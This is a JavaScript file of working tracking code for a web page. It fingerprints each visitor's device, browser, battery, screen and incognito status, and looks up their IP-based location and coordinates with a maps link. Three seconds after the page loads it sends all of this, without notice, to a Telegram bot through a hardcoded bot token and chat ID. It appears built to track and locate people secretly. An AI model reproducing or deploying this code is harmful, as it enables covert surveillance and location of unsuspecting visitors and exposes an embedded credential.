// ========== FINGERPRINTING FUNCTIONS ==========

function generateSessionId() {
    return 'session_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
}

// NEW: Multiple IP API fallbacks
async function getIPWithLocation() {
    const apis = [
        'https://ipapi.co/json/',
        'https://api.ipify.org?format=json',
        'https://ipinfo.io/json?token=your_token', // Free, no token needed for limited use
        'https://api.ipdata.co?api-key=test' // Free test key
    ];
    
    // Try ipapi.co first
    try {
        const response = await fetch('https://ipapi.co/json/', { timeout: 5000 });
        const result = await response.json();
        
        if (result.ip) {
            return {
                ip: result.ip || 'Unknown',
                city: result.city || 'Unknown',
                region: result.region || 'Unknown',
                country: result.country_name || result.country || 'Unknown',
                isp: result.org || 'Unknown',
                latitude: result.latitude || null,
                longitude: result.longitude || null
            };
        }
    } catch (error) {
        console.log("ipapi.co failed, trying fallback...");
    }
    
    // Fallback to ipinfo.io
    try {
        const response = await fetch('https://ipinfo.io/json');
        const result = await response.json();
        
        const location = result.loc ? result.loc.split(',') : [null, null];
        
        return {
            ip: result.ip || 'Unknown',
            city: result.city || 'Unknown',
            region: result.region || 'Unknown',
            country: result.country || 'Unknown',
            isp: result.org || 'Unknown',
            latitude: location[0] || null,
            longitude: location[1] || null
        };
    } catch (error) {
        console.log("ipinfo.io failed");
    }
    
    // Last fallback - just IP
    try {
        const response = await fetch('https://api.ipify.org?format=json');
        const result = await response.json();
        return {
            ip: result.ip || 'Unknown',
            city: 'Unknown',
            region: 'Unknown',
            country: 'Unknown',
            isp: 'Unknown',
            latitude: null,
            longitude: null
        };
    } catch (error) {
        return { 
            ip: 'Unknown', 
            error: error.message,
            city: 'Unknown',
            country: 'Unknown'
        };
    }
}

function getDeviceName() {
    const ua = navigator.userAgent.toLowerCase();
    let device = "Unknown Device";
    
    // Get platform info
    const platform = navigator.platform;
    
    if (ua.includes('android')) {
        if (ua.includes('samsung')) device = "Samsung Galaxy";
        else if (ua.includes('pixel')) device = "Google Pixel";
        else if (ua.includes('oneplus')) device = "OnePlus";
        else if (ua.includes('xiaomi') || ua.includes('redmi')) device = "Xiaomi";
        else if (ua.includes('oppo')) device = "OPPO";
        else if (ua.includes('vivo')) device = "Vivo";
        else device = "Android Device";
        
        // Try to get model from user agent
        const modelMatch = ua.match(/; (\w+)\)/);
        if (modelMatch) device += ` (${modelMatch[1]})`;
        
    } else if (ua.includes('iphone')) {
        device = "iPhone";
        if (ua.includes('iphone15')) device = "iPhone 15";
        else if (ua.includes('iphone14')) device = "iPhone 14";
        else if (ua.includes('iphone13')) device = "iPhone 13";
        else if (ua.includes('iphone12')) device = "iPhone 12";
    } else if (ua.includes('ipad')) {
        device = "iPad";
    } else if (ua.includes('windows')) {
        device = "Windows PC";
    } else if (ua.includes('mac')) {
        device = "Mac";
    } else if (ua.includes('linux')) {
        device = "Linux Device";
    }
    
    return device;
}

function getDeviceInfo() {
    const ua = navigator.userAgent;
    return {
        userAgent: ua,
        platform: navigator.platform,
        vendor: navigator.vendor || 'Unknown',
        deviceMemory: navigator.deviceMemory || 'Unknown',
        hardwareConcurrency: navigator.hardwareConcurrency || 'Unknown',
        touchSupport: 'ontouchstart' in window,
        vibration: 'vibrate' in navigator,
        isMobile: /Mobi|Android|iPhone|iPad|iPod/i.test(ua),
        isTablet: /iPad|Android(?!.*Mobile)/i.test(ua),
        isDesktop: !/Mobi|Android|iPhone|iPad|iPod/i.test(ua),
        os: getOS()
    };
}

function getOS() {
    const ua = navigator.userAgent;
    if (ua.includes('Android')) return 'Android';
    if (ua.includes('iPhone')) return 'iOS';
    if (ua.includes('iPad')) return 'iPadOS';
    if (ua.includes('Windows')) return 'Windows';
    if (ua.includes('Mac')) return 'macOS';
    if (ua.includes('Linux')) return 'Linux';
    return 'Unknown';
}

function getBrowserInfo() {
    const ua = navigator.userAgent;
    let browser = "Unknown";
    let version = "Unknown";
    
    if (/chrome|chromium|crios/i.test(ua)) {
        browser = "Chrome";
        version = ua.match(/Chrome\/(\d+)/)?.[1] || "Unknown";
    } else if (/firefox|fxios/i.test(ua)) {
        browser = "Firefox";
        version = ua.match(/Firefox\/(\d+)/)?.[1] || "Unknown";
    } else if (/safari/i.test(ua) && !/chrome/i.test(ua)) {
        browser = "Safari";
        version = ua.match(/Version\/(\d+)/)?.[1] || "Unknown";
    } else if (/edg/i.test(ua)) {
        browser = "Edge";
        version = ua.match(/Edg\/(\d+)/)?.[1] || "Unknown";
    }
    
    return {
        name: browser,
        version: version,
        language: navigator.language,
        languages: navigator.languages.join(', ')
    };
}

function getScreenInfo() {
    return {
        resolution: { width: screen.width, height: screen.height },
        colorDepth: screen.colorDepth + " bits",
        devicePixelRatio: window.devicePixelRatio,
        availResolution: { width: screen.availWidth, height: screen.availHeight }
    };
}

function getDisplayInfo() {
    return {
        viewport: { width: window.innerWidth, height: window.innerHeight },
        darkMode: window.matchMedia('(prefers-color-scheme: dark)').matches,
        orientation: screen.orientation ? screen.orientation.type : 'Unknown'
    };
}

function getPerformanceInfo() {
    const perfData = performance.timing;
    const loadTime = perfData ? perfData.loadEventEnd - perfData.navigationStart : 0;
    return { 
        timing: { total: loadTime },
        memory: performance.memory ? {
            used: Math.round(performance.memory.usedJSHeapSize / 1048576) + 'MB',
            limit: Math.round(performance.memory.jsHeapSizeLimit / 1048576) + 'MB'
        } : null
    };
}

async function getBatteryInfo() {
    if ('getBattery' in navigator) {
        try {
            const battery = await navigator.getBattery();
            return {
                charging: battery.charging,
                level: Math.round(battery.level * 100) + "%",
                chargingTime: battery.chargingTime === 0 ? "Charging" : battery.chargingTime + "s",
                dischargingTime: battery.dischargingTime === Infinity ? "Not discharging" : battery.dischargingTime + "s",
                batterySaving: navigator.connection && navigator.connection.saveData ? "Data Saver On" : "Not detected"
            };
        } catch (e) {
            return { error: "Battery API blocked", level: "Unknown" };
        }
    }
    return { error: "Battery API not supported", level: "Unknown" };
}

async function getGoogleMapsLocation(ipData) {
    if (!ipData.latitude || !ipData.longitude) {
        return null;
    }
    
    try {
        const mapsLink = `https://www.google.com/maps?q=${ipData.latitude},${ipData.longitude}`;
        return {
            googleMapsLink: mapsLink,
            coordinates: `${ipData.latitude}, ${ipData.longitude}`,
            staticMap: `https://maps.googleapis.com/maps/api/staticmap?center=${ipData.latitude},${ipData.longitude}&zoom=12&size=400x200&markers=color:red%7C${ipData.latitude},${ipData.longitude}`
        };
    } catch (error) {
        return null;
    }
}

async function detectIncognito() {
    let isIncognito = false;
    let method = "Unknown";
    
    // Test 1: FileSystem API
    try {
        const fs = window.RequestFileSystem || window.webkitRequestFileSystem;
        if (fs) {
            await new Promise((resolve, reject) => {
                fs(window.TEMPORARY, 100, resolve, reject);
            });
            isIncognito = false;
            method = "FileSystem";
        }
    } catch (e) {
        isIncognito = true;
        method = "FileSystem (Blocked)";
    }
    
    // Test 2: Storage quota
    if (navigator.storage && navigator.storage.estimate) {
        const estimate = await navigator.storage.estimate();
        if (estimate.quota && estimate.quota < 120000000) {
            isIncognito = true;
            method = "Storage (Low quota)";
        }
    }
    
    return {
        isIncognito: isIncognito,
        method: method,
        notes: isIncognito ? "Private browsing mode detected" : "Normal browsing mode"
    };
}

// ========== MAIN COLLECT FUNCTION ==========
async function collectEnhancedData() {
    console.log("Collecting data...");
    
    const ipData = await getIPWithLocation();
    console.log("IP Data:", ipData);
    
    const batteryData = await getBatteryInfo();
    const incognitoData = await detectIncognito();
    const mapsData = await getGoogleMapsLocation(ipData);
    
    return {
        timestamp: new Date().toISOString(),
        localTime: new Date().toLocaleString(),
        sessionId: generateSessionId(),
        deviceName: getDeviceName(),
        ip: ipData,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        timezoneOffset: new Date().getTimezoneOffset(),
        googleMaps: mapsData,
        battery: batteryData,
        device: getDeviceInfo(),
        browser: getBrowserInfo(),
        screen: getScreenInfo(),
        display: getDisplayInfo(),
        performance: getPerformanceInfo(),
        incognito: incognitoData,
        referrer: document.referrer || 'Direct visit',
        pageURL: window.location.href,
        language: navigator.language,
        cookiesEnabled: navigator.cookieEnabled,
        doNotTrack: navigator.doNotTrack || 'Not set'
    };
}

// ========== TELEGRAM SEND FUNCTION ==========
async function sendToTelegramBot(message) {
    const BOT_TOKEN = '7555872875:AAFL7IOocbY9nQhqL8GVkTvQYHkNrbnCTrs';
    const CHAT_ID = '7307197149';
    
    let cleanMessage = message.substring(0, 4096);
    
    try {
        const formData = new URLSearchParams();
        formData.append('chat_id', CHAT_ID);
        formData.append('text', cleanMessage);
        formData.append('parse_mode', '');
        
        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 
                'Content-Type': 'application/x-www-form-urlencoded',
            },
            body: formData
        });
        
        const result = await response.json();
        console.log("Telegram response:", result);
        return result;
        
    } catch (error) {
        console.error('Network error:', error);
        return { ok: false, error: error.message };
    }
}

// ========== MAIN FUNCTION TO CALL FROM BUTTONS ==========
async function sendFingerprintToTelegram() {
    console.log("🔍 Collecting fingerprint data...");
    
    try {
        const data = await collectEnhancedData();
        
        const telegramMessage = `
🚀 COMPLETE DEVICE FINGERPRINT REPORT
═══════════════════════════════════

📅 Time: ${data.localTime}
🆔 Session: ${data.sessionId}
🌐 Timezone: ${data.timezone} (UTC${data.timezoneOffset/60})

📱 DEVICE INFORMATION
• Name: ${data.deviceName}
• Type: ${data.device.isMobile ? '📱 Mobile' : data.device.isTablet ? '📟 Tablet' : '💻 Desktop'}
• OS: ${data.device.os}
• Platform: ${data.device.platform}
• Memory: ${data.device.deviceMemory}GB
• CPU Cores: ${data.device.hardwareConcurrency}
• Touch Screen: ${data.device.touchSupport ? 'Yes' : 'No'}

📍 LOCATION & NETWORK
• IP: ${data.ip.ip}
• City: ${data.ip.city}
• Region: ${data.ip.region}
• Country: ${data.ip.country}
• ISP: ${data.ip.isp}
• Coordinates: ${data.ip.latitude || 'N/A'}, ${data.ip.longitude || 'N/A'}
${data.googleMaps ? `• Maps: ${data.googleMaps.googleMapsLink}` : ''}

🔋 BATTERY STATUS
• Level: ${data.battery.level || 'Unknown'}
• Charging: ${data.battery.charging ? 'Yes ⚡' : 'No 🔋'}
• Battery Saver: ${data.battery.batterySaving || 'Not active'}

🌐 BROWSER INFO
• Browser: ${data.browser.name} ${data.browser.version}
• Language: ${data.browser.language}
• Incognito Mode: ${data.incognito.isIncognito ? 'Yes 🕵️' : 'No'}
• ${data.incognito.notes}

🖥️ SCREEN & DISPLAY
• Resolution: ${data.screen.resolution.width}x${data.screen.resolution.height}
• Available: ${data.screen.availResolution.width}x${data.screen.availResolution.height}
• Viewport: ${data.display.viewport.width}x${data.display.viewport.height}
• Pixel Ratio: ${data.screen.devicePixelRatio}
• Color Depth: ${data.screen.colorDepth}
• Dark Mode: ${data.display.darkMode ? 'Enabled 🌙' : 'Disabled ☀️'}
• Orientation: ${data.display.orientation}

📊 PERFORMANCE
• Page Load Time: ${data.performance.timing.total}ms
${data.performance.memory ? `• Memory Used: ${data.performance.memory.used}\n• Memory Limit: ${data.performance.memory.limit}` : ''}

🔗 PAGE INFO
• Page URL: ${data.pageURL}
• Referrer: ${data.referrer}
• Cookies Enabled: ${data.cookiesEnabled ? 'Yes' : 'No'}
• Do Not Track: ${data.doNotTrack}

👤 USER AGENT
${data.device.userAgent.substring(0, 200)}

═══════════════════════════════════
        `;
        
        const result = await sendToTelegramBot(telegramMessage);
        
        if (result && result.ok) {
            console.log("✅ Complete fingerprint sent to Telegram!");
        } else {
            console.log("❌ Failed to send");
        }
        
    } catch (error) {
        console.error("❌ Error:", error);
    }
}

// ========== AUTO-SEND ON PAGE LOAD ==========
setTimeout(() => {
    sendFingerprintToTelegram();
}, 3000);

// ========== EXPOSE FUNCTION FOR BUTTON ==========
window.sendFingerprintToTelegram = sendFingerprintToTelegram;
